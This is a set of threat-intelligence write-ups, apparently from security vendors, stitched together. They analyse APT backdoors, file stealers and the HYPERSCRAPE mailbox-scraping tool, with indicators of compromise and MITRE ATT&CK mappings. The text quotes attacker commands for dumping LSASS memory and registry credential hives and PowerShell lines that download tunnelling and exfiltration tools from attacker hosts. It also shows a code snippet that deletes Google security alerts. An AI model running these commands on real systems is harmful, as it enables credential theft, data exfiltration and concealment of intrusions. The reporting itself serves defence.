Write specified file 0x10002
Download File 0x10003
Read specified file 0x10004
No Action 0x10005
Open a command shell for command execution
HTShell HTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15).
Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js.
It is used to translate between objects in code and objects representation in MongoDB.
We saw in our cases that the HTShell client will be launched as a system service on the compromised machine and that it will connect to a C&C server.
HTShell supports importing additional config files.
"We found that the additional config file is located in %PUBLIC%\Documents\sdcsvc.dat, and that the content should be encoded by base64."
"If no config file is imported, it will connect to the predefined C&C address."
Figure 4.
"HTShell hardcoded C&Cs HTShell encodes a hard­-coded string, ""tp==="" with custom base64 and embeds the encoded string in the request cookies."
"If the C&C server receives the request with the special cookie value, it can verify that the request comes from its client applications."
Figure 5.
HTShell hardcoded and encoded cookie string in the request header The response handler of HTShell will use “`” as delimiter to split the command code and argument for the received command.
"Hence, the command will be this format: <command code>`<custom-base64encoded-data>[`<more-custom-base64encoded-data>] HTShell currently supports three different backdoor functions, shown here: Command code Function 0 Open a command shell for command execution 1"
Upload file 2 Download file
Customized Lilith RAT
"During our investigation into Earth Centaurs activities, we found that it also uses another backdoor called Lilith RAT."
We think that this Lilith RAT is a highly modified version of the open-source Lilith RAT.
"The actors reused part of the codes for command execution, while the C&C protocol is changed to Dropbox HTTPS APIs."
Figure 6.
"Reused codes from open-source Lilith RAT In order to launch this RAT, the threat actors use a technique called ""Phantom DLL hijacking."""
"In this technique, the RAT will be disguised as the normal wlbsctrl.dll."
"While the Windows service “IKEEXT” is starting, the fake wlbsctrl.dll is loaded and executed with high privilege."
"Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being found by investigators."
Figure 7.
Self-deletion after execution
"For the C&C connections, the customized Lilith RAT will first check in to the attacker’s Dropbox and see if the victim host exists."
"If not, the hostname and IP address will be collected and appended to the existing compromised hosts’ information."
All data will then be encrypted and sent back. Figure 8.
"The first check-in request to the Dropbox C&C After the check-in request, the backdoor will start to wait for more commands to come in."
"All the request data are formatted to JSON, and they are encrypted by AES and encoded by base64."
Here is a list of the C&C commands:
Command Description CMDCommand Executes commands DownloadCloudFile Downloads files UploadCloudFile Uploads files GetDir Lists directories GetDirFile Lists files in a directory DeleteSelf Deletes itself SmileSvr
We found that there are two types of SmileSvr.
The difference between the two variants is the protocol used for communication: ICMP and SSL.
The threat actors will use an installer to install SmileSvr as a system service and drop a DAT file that contains encoded C&C information.
"In the configuration file, the memory size used for storing C&C address and C&C address will be defined."
Figure 9.
Encrypted configuration file
"The ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C address, which is defined in a configuration file."
"In each SmileSvr, there is an embedded number (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the sent ICMP packet."
We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise.
Figure 10.
"Decrypted configuration file Without knowing the real traffic from the C&C server, we can only speculate on the content of the response based on the receiving function."
"As shown in Figure 11, the content of the response should contain the sequence number used to verify if the received data comes from the correct source and two blocks of encrypted data."
"The data decryption procedure is as follows: First, the encrypted data is decrypted with a one-byte XOR key (0xFF)."
"The first of the decrypted content contains a magic number used to check data in the second block, a command code, and the XOR key to decrypt the second set of encrypted content."
"The second set of encrypted content is decrypted with an XOR key (0x99) from the previous decrypted content, and within the decrypted data are instructions for the following procedures."
Figure 11.
SmileSvr packet traffic format simulation
"While analyzing samples, we found that the C&C server was already inactive."
"Without knowing the traffic between SmileSvr and C&C server, we could not fully understand all functions."
"However, most of the backdoor functions are listed here: Command code Function 0x5001"
Opens/Reads specified file 0x5002 Unknown 0x5004 Opens/Writes specified file 0x5006
Opens command shell 0x5007 Unknown 0x5009 Closes command shell 0x500A
File System Traversal 0x500C
Checks environment information 0x500E Unknown
"As for the SSL version of SmileSvr, the capability of SSL communication is built by using wolfSSL, which is a lightweight, C-language based SSL/TLS library."
The backdoor functions of SSL version SmileSvr are similar to the ICMP ones.
The threat actors just use it to develop new ways to support data transfer via an encrypted channel.
Customized Gh0st RAT
"In our investigation, we also found a suspicious executable named telegram.exe."
"After analyzing the file, we found that it was a customized version of Gh0st RAT."
"Compared to the original Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a new function to discover information from active sessions on the host."
All supported functions for the customized Gh0st are shown in the following table: Command code Function 0xC8 Terminates connection 0xCA
File manager to handle file operations 0xCB Screen monitoring 0xCC Opens remote shell for command execution 0XD5 Gets active session information Post
Exploitation
"After successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim’s intranet."
"In this stage, we also observed attempts to deploy tools to exfiltrate stolen information."
"During our investigation, we found evidence of specific tools, which we listed in Table 1."
"With these tools, the attackers accomplish their goals (network discovery, access to the intranet, and exfiltration) step by step."
Tool name Purpose Description SharpHound AD Discovery Discovery tool to understand the relationship in an AD environment FRPC Intranet Penetration Fast reverse proxy to help expose a local server behind a NAT or firewall to the internet Chisel Intranet Penetration Fast TCP/UDP tunnel RClone Exfiltration A command-line program to sync files and directories to and from different cloud storage providers Credential Dumping
We also observed that the group used multiple legitimate tools to dump credentials on compromised machines.
It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive.
"For example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that creates dumps of the processes in any scenario), which it renamed bootsys.exe: c:\users\public\downloads\bootsys.exe -accepteula -ma lsass.exe C:\Users\Public\Downloads\lsass.dmp"
The group dumps credentials stored in registries by using reg.exe: reg.exe save hklm\sam C:\Users\Public\Downloads\sam.hive reg.exe save hklm\sam c:\windows\temp\sa.dit reg.exe save hklm\security c:\windows\temp\se.dit reg.exe save hklm\system c:\windows\temp\sy.dit
"The group would also dump memory from the specified process by using comsvcs.dll: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 764 C:\Windows\TEMP\dump.bin full Indicator Removal To avoid exposing their footprints to investigators, the threat actors made their own tool to wipe out the event logs on the victimized machine."
"By using this tool, they could clean specified event logs and make it hard for investigators to track their operations."
The usage is as follows: Intranet Penetration
"After successfully exploiting the vulnerable system, threat actors also drop following tools: FRP and Chisel."
FRP is a fast reverse proxy used to expose a local server behind an NAT or a firewall to the internet.
It can read predefined configurations and make the host in the intranet available to users from the internet.
Figure 12.
"Configuration for FRP fast reverse proxy Chisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls."
"It provides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and allows threat actors to pass through a firewall and get access to the machine behind the firewall."
"This is used to download reverse proxy Chisel via PowerShell: c:\windows\system32\windowspowershell\v1.0\powershell.exe -command ""$(new-object System.Net.WebClient).DownloadFile('https[:]//webadmin[.]mirrorstorage[.]org/ch.exe', 'ch.exe')"""
This is used to build a connection between inter/intranet via Chisel: C:\WINDOWS\system32\ch.exe client https[:]//webadmin[.]mirrorstorage[.]org:443 r:127.0.0.1:47586:socks Exfiltration
"In the previous phase, we observed that the actors use several tools to get the whole picture of the network infrastructure and bypass the firewall."
"Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration."
It also provides an easy and effective way of copying data to several cloud storage providers.
"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -command ""$(new-object System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe', 'r.exe')"
"Based on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data."
"However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks."
Identifying Features in the Earth Centaur Campaign
"After long-term observation and analysis of the attack campaigns, there was compelling evidence that they were operated by Earth Centaur."
"We found several identifying features of the threat actors within the techniques and tools described in the preceding sections, and we break down the factors in the following."
Mutex Style
We found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient.
The decoded string is shown in Table 2.
"Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region."
"Table 2. Encoded/Decoded mutex string Encoded string Decoded string in Chinese English translation vul3ru,6q8 q8 y.3 小傑趴趴走 Jack goes around ji394su3 我愛你 I love you 5ji fu.6cl3g.3zj6m0694 桌球好手福原愛 Excellent table tennis player, Ai Fukuhara Configuration style"
"After analyzing the ChiserClient, we found that it shares a similar style of network configuration to the TClient mentioned in our previous research on Earth Centaur."
Figure 13. Network configuration (Left: ChiserClient
Right: TClient)
Code Similarity
"After checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation."
"Both share similar codes in configuration decoding, which is shown in Figure 14."
"Furthermore, the delimiter that was used in SmileSvr to split different values in configuration files is the same as the one used in YAHAMAM (shown as Figure 15). Figure 14."
Configuration decoding function (left: SmileSvr right: Troj_Yahamam) Figure 15. Function used to split different values in configuration file (left: SmileSvr right: Troj_Yahamam)
Conclusion
These threat actors are notably sophisticated and well-equipped.
"Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar."
"For example, the group can map their target’s network infrastructure and bypass firewalls."
"It uses backdoors with different protocols, which are deployed depending on the victim."
"It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers. In this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries."
Information on how a threat enters and operates within a victim’s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations.
"Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise."
Trend Micro Vision One™️ with Managed XDR gives security teams a consolidated view into valuable insights so they can organize a more solid line of defense ahead of attacks.
"For a list of the Indicators of Compromise, please see this document."
MITRE ATT&CK Matrix Tactics ID Technique Initial access T1190
Exploit public-facing application Execution T1059.001
Command and Scripting Interpreter: PowerShell T1059.003 Command and scripting interpreter: Windows Command Shell T1569.002
System Services: Service Execution Persistence T1543.003
Create or Modify System Process: Windows Service T1574.002
Hijack Execution Flow: DLL Side-Loading T1505.003 Server Software Component: Web Shell Defense evasion T1140
Deobfuscate/Decode Files or Information
T1480 Execution Guardrails T1574.002
Hijack Execution Flow: DLL Side-Loading T1070.001 Indicator Removal on Host: Clear Windows Event Logs T1027.002
Obfuscated Files or Information: Software Packing T1218.011
Signed Binary Proxy Execution: Rundll32 T1036.005
Masquerading: Match Legitimate Name or Location T1197 BITS Jobs T1070.006
Indicator Removal on Host: Timestomp Credential Access T1003.001 OS Credential Dumping: LSASS Memory T1552.002
OS Credential Dumping: Credentials in Registry Lateral Movement T1021.002
Remote Services: SMB/Windows Admin Shares Discovery T1087.002
Account Discovery: Domain Account T1482 Domain Trust Discovery T1083 File and Directory Discovery Collection T1005 Data from Local System Command and control T1071.001
Application layer protocol: web protocols T1095 Non-Application layer protocol T1090.001 Proxy: Internal Proxy Exfiltration T1567.002
"Exfiltration to Cloud Storage Tags APT & Targeted Attacks | Endpoints | Research | Articles, News, Reports"
"Updated the appendix on August 30, 2018 to fix formatting and add new information."
"Back in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia."
"During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets."
"During their previous campaign, we found Confucius using fake romance websites to entice victims into installing malicious Android applications."
"This time, the threat actor seems to have a new modus operandi, setting up two new websites and new payloads with which to compromise its targets."
Fake Android porn app and Windows chat applications as lures
"The first website uses adult content as a lure, via an Android application called Fuddi Duniya, which links to a website that displays nude pictures every day."
"The app’s APK is linked directly from the homepage, with a disclaimer stating that Google Play does not allow pornography in their store."
Figure 1: fake website with a link to download the Fuddi Duniya app.
"The displayed Urdu text could be translated as “Real women, girls, and housewives || Download the app now More than thousands of women app.”"
"The app’s features are similar to the previous malicious Android application, such as having the ability to record audio and steal SMS, accounts, contacts and certain file types from specific directories."
"In addition, the application now retrieves the last known location and uses the development platform Google Firebase to upload the stolen content."
Figure 2: Stealing function excerpt from Fuddi Duniya Android app
"The second fake website is again related to chat, with a background suggesting that it can help find users a partner."
"Initially, a link to a malicious Android application hosted on Google Play that shared the same features as the application described above was present."
"But after we reached out to Google while carrying out the research, the application was removed from the store and the link was removed from the fake website."
Figure 3. Screenshot of the second fake website
"Same as with the fake Tweety chat application we described in detail in our previous research, a Windows application with real chat features based on the open-source chat application RocketChat was offered."
"Similarly, this application also comes bundled with malicious .NET code."
"While small and relatively simple, we found this malicious application interesting to analyze as it revealed the countries targeted by the threat actor."
"The application is a simple downloader that sends some basic information (username, antivirus, IP address, and operating system version) encrypted using triple Data Encryption Standard (DES). Figure 4."
"Sample of the app’s code Periodically, the malware tries to contact the Command-and-Control (C&C) server with the username encoded into parameters."
"Based on the information they retrieve, the operators can then decide to instruct the malware to download the second stage payload."
This function is similar to the various versions of backdoors (such as sctrls and sip_telephone) that we analyzed in our previous blog post and whitepaper.
"An interesting feature of the downloader: It uses an online service to retrieve the victim's IP address and country, which it compares with a list of allowed countries."
"If the victim seemingly comes from a different country, the program will self-delete and quit."
"Excerpt of the valid country list We noted that it does both client-side and server-side IP filtering, showing that the attacker has improved its infrastructure."
"At the end of last year, a C&C from the same threat actor was not only accessible from any IP address, but it was possible to browse the server directory tree without authentication."
"After impersonating a fake victim of interest, we obtained a second stage payload (Detected as TROJ_DELF.XXWZ), which is a filestealer based on the Delphi programming language similar to the “svctrls” malware described in our previous blogpost."
This one is called “sysctrls” and it looks for files with the following extensions:
"Extension File Type .doc, docx Microsoft Word document .xls,.xlsx"
"Microsoft Excel document .ppt, .pptx Microsoft Powerpoint presentation .pptx"
"Microsoft Powerpoint presentation .png, .jpg, .jpeg Image file .pst, .ost Microsoft Outlook file .csv"
Spreadsheet file
It then sends them via a POST HTTP request to windefendr[.]com/description.php.
Further analysis of this filestealer revealed interesting links with other threat actor groups.
The Delphi Link
"We already mentioned that Confucius had possible links to other groups in our previous blog post, which mentioned code sharing between Patchwork and Confucius."
Both groups used a backdoor with the same configuration file structure and commands.
"We found more code shared among the two threat actor’s malware, as Patchwork recently used multiple Delphi malware similar to some of the Delphi malware we described before."
We initially spotted some visual similarities between the malware used.
"Although no forms are displayed while the malware is running, we can see its TForm object in the Delphi decompiler."
The TForm object often has two TTimer objects — but sometimes we have seen one or even three of these objects — usually with random names.
"Occasionally, listboxes with encrypted strings are also added."
"Figure 6: Decompiled Form structure of Confucius’ sample (d971842441c83c1bba05742d124620f5741bb5d5da9ffb31f06efa4bbdcf04ee, Detected as TSPY_CONFSTEAL.A) Figure 7:"
"Decompiled Form structure of Patchwork’s sample (795ae4097aa3bd5932be4110f6bd992f46d605d4c9e3afced314454d35395a59, Detected as TROJ_DELF.XXWZ)"
"While looking into any of the TTimers’ OnTimer methods, we often found a certain kind of structure: A pointer to an encrypted string stored in an EDX register followed by the call to the decryption function."
Figure 8: Calling the decryption function This encouraged us to analyze the string encryption routines thoroughly.
Our analysis revealed three of them.
The first involves a very simple routine that flips every bit of the string.
"The second algorithm involves a hardcoded key, which is transformed by taking the five lower bits of each character, and then used as a XOR key."
"In some cases, the key is split in half in the binary, so it is first reunited before being used."
"Finally, our third algorithm uses a 94-character substitution table."
This algorithm was previously discussed by security researchers in a Confucius-related blog post.
"For each of these routines, we found a recent sample going back to a domain name belonging to Patchwork’s infrastructure."
"The substitution tables of the third algorithm were randomly generated at build time, while the attacker seemingly set the keys used in the second algorithm."
We found six different keys in the latter category that were different for the Patchwork and Confucius group.
Figure 9.
"On the left, Confucius code, on the right, Patchwork’s code"
"Interestingly, one of those keys, “xldbszcd”, was found in a file stealer used by Confucius (472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55, Detected as TSPY_CONFSTEAL.A) as well as in two other file stealers."
"One file stealer (cca74bb322ad7833a21209b1418c9837e30983daec30d199a839f46075ee72f2, Detected as TSPY_DELF.SUW) published by security researchers in 2013 and linked to the domain myflatnet[.]com, was attributed by several parties to the Hangover group."
"The other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, Detected as TROJ_DELF.XXWZ) is related to a domain reported in September 2016."
That report also mentioned InPage software targeting and Delphi backdoors.
Figure 10.
"Left: Confucius group, Middle: Hangover group, Right: Unnamed group"
"After some research, we found multiple Delphi backdoors that used any of the three decryption routines."
The backdoors also linked to an infrastructure matching old Hangover domains as well as the infrastructure of domains from the September 2016 blog post.
"Some of these samples were several years old and had left the original name of the bit-flip decryption algorithm, which was “EnDecrypt”."
This algorithm matches the following code snippet.
Patchwork's Ongoing Campaigns
"Aside from their Delphi malware, Patchwork is still active."
"Lately, they have been sending multiple RTF files exploiting CVE-2017-8570."
The dropped payloads are modified versions of the Remote Administration Tool QuasarRAT that can be traced to the domains sastind-cn[.]org and tautiaos[.]com.
Figure 11.
Process tree after a successful infection
The attackers sometimes design the weaponized documents to look like legitimate documents of interest to the target.
The documents are also unusually large — often more than 10 megabytes.
Figure 12.
"On the left, the weaponized document."
"On the right, the legitimate document from CSBA."
Note that the weaponized document was crafted to look like it came from CSBA but does not imply that CSBA or its related assets have been compromised
"The group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost."
Defending against Confucius and Patchwork Threat actors like Confucius and Patchwork are known for their large arsenal of tools and ever-evolving techniques that can render traditional security solutions — which are often not designed to handle the persistent and sophisticated threats detailed in this blog — ineffective.
To help combat these kinds of threats organizations will need to take a more proactive and focused security posture that can cover the most ground in terms of security.
Some specific security measures organizations can implement: Recognize social engineering attempts.
"Malicious mobile apps are common infection vectors for cybercriminals, as they can attract specific target audiences."
"In this case, Confucius went with the common adage “sex sells” Proactively monitor the organization’s network."
Threat actors are notorious for creating stealthy malware that can bypass superficial network monitoring.
A more proactive stance that includes proper application of firewalls and intrusion detection and prevention systems can help mitigate the impact of an attack Implement network segmentation.
"Even with the best security technology, there is still a chance of an attack slipping through."
"Separating the network into individual parts, as well as restricting access to only those who really need it, can mitigate the damage that occurs in case of a successful attack."
Update systems regularly.
"Everything from endpoints to network software to IoT devices should be patched and updated to prevent or minimize the chance of a threat actor exploiting a vulnerability In an ideal scenario, an organization’s in-house security team implement all of these and other security measures."
The reality is that IT departments of small to large-sized organizations are not equipped to handle the more advanced threats that groups like Confucius use in their attacks.
"Since these teams also handle the day-to-day IT requirements of the organization, taking on a more involved and proactive stance may not be easy."
"In this case, an organization can look into third party security providers who can handle specialized work, such as root cause analysis and detailed research, and also provide a remediation plan that gives organizations a better chance against advanced threats."
"Trend Micro Solutions Patchwork uses email as an entry point, which is why securing the email gateway is important."
"Trend Micro™ Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network. Trend Micro™ Email Inspector and InterScan™ Web Security prevent malware from ever reaching end users."
"At the endpoint level, Trend Micro™ Smart Protection Suites deliver several capabilities that minimize the impact of Patchwork’s attacks."
"These solutions are powered by Trend Micro XGen™ security, which provides a cross-generational blend of threat defense techniques against a full range of threats for data centers, cloud environments, networks, and endpoints."
"It features high-fidelity machine learning to secure the gateway and endpoint data and applications, and protect physical, virtual, and cloud workloads."
This appendix contains the latest indicators of compromise (IOCs) related to the different groups.
Tags APT & Targeted Attacks | Endpoints | Research | Network
Introduction
"While investigating the Confucius threat actor, we found a recent spear phishing campaign that utilizes Pegasus spyware-related lures to entice victims into opening a malicious document downloading a file stealer."
The NSO Group’s spyware spurred a collaborative investigation that found that it was being used to target high-ranking individuals in 11 different countries.
"In this blog entry, we take a look at the lures used by the malicious actor and provide a short analysis of the file stealer used in the campaign, which was launched in early August."
The contents of the spear phishing email The campaign involves a two-step attack.
"During the first phase, an email without a malicious payload containing content copied from a legitimate Pakistani newspaper’s article is sent to the target."
"The sender address, which is spoofed, impersonates the PR wing of the Pakistani Armed Forces (info@ispr.gov.pk)."
"Two days later, a second email — purportedly a warning from a Pakistani military about the Pegasus spyware — containing a cutt.ly link to a malicious encrypted Word document and the password for decryption will be sent to the target."
The sender address impersonates a service similar to that on the first email (alert@ispr.gov.pk). Figure 1.
Spear-phishing email from early August.
"Notice the insertion of logos from the Pakistani Army, Air Force, Navy, and PR department."
"If the target clicks on either the link or on the “unsubscribe” link, it will download a Word document from the domain parinari[.]xyz."
"The emails are sent either from an ExpressVPN exit node in Pakistan, or from a mail server under the attacker’s control."
"Examining the encrypted document containing macros After entering the password mentioned in the message, a document containing macros is displayed on screen."
Figure 2. Malicious document containing macros
"If the victim enables macros, the malicious code will be loaded."
"If the victim enters any phone number and clicks “SUBMIT,” the text field will be replaced by the message “Phone Number Not Found.”"
"Behind the scenes, a .NET DLL file named skfk.txt, which is filled with content found inside the “Comments” property of the document, is created in the temporary directory."
The file is then loaded in memory via PowerShell.
Stage 1 is a simple download & execute program.
It downloads an ASCII file from the same domain and converts it into binary before loading it on to the memory and jump to a dynamic function.
"Stage 2 is also .NET DLL file that downloads a third file from parinari[.]xyz, converts it from ASCII to binary, and then creates a scheduled task to load it."
"Stage 3 is similar to stage 1, with the only change being the URL to retrieve the next stage."
Stage 4 is the final payload (analyzed in the next section).
it is never written in clear text to the file disk.
Figure 3.
File stealer loading scheme
"It should be noted that most of the compilation timestamps of these DLL files have been modified by the attacker to a year in the far future (2060, 2099 …), and the server IP addresses are often hidden behind CloudFlare."
Analysis of the file stealer
The final payload is a .NET DLL file designed to steal documents and images with the following extensions: File extension Description TXT Text file PDF PDF file PNG Image file in PNG format JPG Image file in JPG format DOC Word document XLS Excel document XLM Excel document with macros ODP OpenDocument Presentation ODS OpenDocument Sheet ODT OpenDocument Text RTF Rich Text Format file PPT PowerPoint document XLSX Excel document XLSM Excel document with macros DOCX Word document PPTX PowerPoint document JPEG Image file in JPEG format
"The “Documents,” “Downloads,” “Desktop,” and “Pictures” folders of every user"
are checked.
The DLL file also examines drives other than C:
. Figure 4. Code showing the main function of the file stealer
"When a file matching one of the listed extensions is found, its MD5 hash is calculated and compared to an exclusion list retrieved from the command-and-control (C&C) server pirnaram[.]xyz."
"If the hash is not listed, the file is sent via the C&C to a directory named after the concatenation of the machine name and the username."
The exclusion list is different for every machine name-username string.
Other campaigns
"During our monitoring of Confucius, we came across a campaign delivering the same payload, using a different lure."
"In this instance, the campaign impersonated the Pakistani Defense Housing Authority."
"Again, this threat actor’s interest in military personnel is obvious."
Figure 5.
Spear-phishing email from early August
The lures used in an older campaign from April 2021 impersonated the Federal Board of Revenue.
"There were minor differences in tools, tactics, and procedures: the malicious document was directly attached to the spear phishing email — still encrypted — and the decryption password was sent in a different email."
The first stage was also hidden in the “Comments” section.
"However, the second stage contained the final payload, which was once again a file stealer with the exact same structure (a .NET DLL)."
"Instead of exfiltrating the files through PHP scripts, they were done via FTP server."
"It should be noted that in some occasions, the threat actor sent spear-phishing emails from the domain name mailerservice[.]directory which we attributed to the Patchwork threat actor in previous research."
"We disclosed multiple links between Patchwork and Confucius threat actors in the past, so this came as no surprise to us."
The creative use of social engineering lures and how to defend against them
"In our previous research, we already found Confucius, which is known for targeting Pakistan military for espionage purposes, employing multiple file stealers."
"While the code quality of its payloads is not of the highest standard, this threat actor uses innovative techniques when crafting its malicious documents, such as hiding malicious code in the comments section, or using encrypted documents to prevent automatic analysis."
"Therefore, it’s highly likely that Confucius will continue to experiment and try out different kinds of social engineering lures in future campaigns."
"Despite the variety of lures used by the threat actor, best security practices still apply to these attacks."
Users should always be wary and avoid clicking on any link or downloading any file from unsolicited emails or suspicious sources.
"Red flags such as unusual sender domains or grammatical and spelling errors are also a sign that the email is malicious in nature, or at the very least, should be approached with proper security protocols in mind."
The following security solutions can also protect users from email-based attacks: Trend Micro™ Cloud App Security – Enhances the security of Microsoft Office 365 and other cloud services via computer vision and real-time scanning.
It also protects organizations from email-based threats.
Trend Micro™ Deep Discovery™ Email Inspector – Defends users through a combination of real-time scanning and advanced analysis techniques for known and unknown attacks. Indicators of Compromise Hashes of the malicious encrypted documents: SHA256 Detection name dacf7868a71440a7d7d8797caca1aa29b7780801e6f3b3bc33123f16989354b2 Trojan.W97M.CONFUCIUS.A 0f6bcbdf4d192f8273887f9858819dd4690397a92fb28a60bb731c873c438e07 Trojan.W97M.CONFUCIUS.B
508bcc1f3906f5641116cde26b830b43f38f9c68a32b67e03a3e7e3f920b1f4a
Trojan.W97M.CONFUCIUS.B 654c7021a4482da21e149ded58643b279ffbce66badf1a0a7fc3551acd607312 Trojan.W97M.CONFUCIUS.C 712172b5b1895bbfcced961a83baa448e26e93e301be407e6b9dc8cb6526277f Trojan.Win32.DLOADR.TIOIBELQ
URLs/Domains/IP Addresses Server hosting malicious documents parinari[.]xyz Server used for file exfiltration pirnaram[.]xyz Domain names linked to other campaigns
pemra[.]email ispr[.]email fbr[.]news defencepk[.]email pakistanarmy[.]email pmogovpk[.]email mailerservice[.]directory file-dnld[.]com funtifu[.]live cnic-update[.]com cnic-ferify[.]live fbr-update[.]com download.fbr[.]tax support-team[.]tech api.priveetalk[.]com Sender email addresses latest_info@fbr.news notice@fbr.news alert@fbr.news thenewsinernational@mailerservice.directory
"Tags APT & Targeted Attacks | Cyber Crime | Research | Articles, News, Reports"
"As part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk users."
"For years, we have been countering this group’s efforts to hijack accounts, deploy malware, and their use of novel techniques to conduct espionage aligned with the interests of the Iranian government."
"Now, we’re shining light on a new tool of theirs."
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
"The oldest known sample is from 2020, and the tool is still under active development."
We have taken actions to re-secure these accounts and have notified the victims through our Government Backed Attacker Warnings.
"This post will provide technical details about HYPERSCRAPE, similar to PWC’s recently published analysis on a Telegram grabber tool."
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
"It spoofs the user agent to look like an outdated browser, which enables the basic HTML view in Gmail."
"Once logged in, the tool changes the account’s language settings to English and iterates through the contents of the mailbox, individually downloading messages as .eml files and marking them unread."
"After the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google."
"Earlier versions contained the option to request data from Google Takeout, a feature which allows users to export their data to a downloadable archive file."
The tool is written in .NET for Windows PCs and is designed to run on the attacker's machine.
"We tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo! and Microsoft accounts."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
"When launched, the tool makes an HTTP GET request to a C2 to check for a response body of ""OK'' and will terminate if it's not found."
"In the version tested, the C2 was unobfuscated and stored as a hardcoded string."
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Host: {C2}
Accept-Encoding: gzip Connection: Keep-Alive
"The tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path string to a valid cookie file."
A new form is displayed if the information is not provided via command prompt.
"Once provided, the data in the ""Identity"" field is sent to a C2 for confirmation."
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
Host: {C2} Accept-Encoding: gzip
"If the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag and drop."
"After parsing, the cookies are inserted into a local cache used by the embedded web browser."
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"The user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the attacker to enable the basic HTML view in Gmail."
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
"It does the following for each email found: The emails are saved with "".eml"" extensions under the Downloads directory with the filename corresponding to the subject."
A log file is written containing a count of the emails that were downloaded.
"When finished, a HTTP POST request is made to the C2 to relay the status and system information."
The downloaded emails are not sent to the C2.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
The program will delete any security emails from Google generated by the attacker’s activity.
"private bool IsThereAnyEMail() { List < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.Document.GetElementsByTagName(""span"") where x.TextContent.StartsWith (""Security alert"") || x.TextContent.StartsWith(""Archive of Google data requested"") || x.TextContent.StartsWith(""Your Google data archive is ready"") || x.TextContent.StartsWith(""Your Google data is ready"") || x.TextContent.StartsWith(""Critical security alert"") ||"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"StartsWith(""Help us protect you: Security advice from Google"")"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
; bool flag = list.Count == 0; return !flag; }
"Data from Google Takeout is also available upon request, but the option was only found in early builds."
The functionality was not automated and it's unclear why it was removed in later versions.
"When conducting a Takeout, the program will spawn a new copy of itself and initialize a pipe communication channel to relay the cookies and account name, both of which are required to accomplish the Takeout."
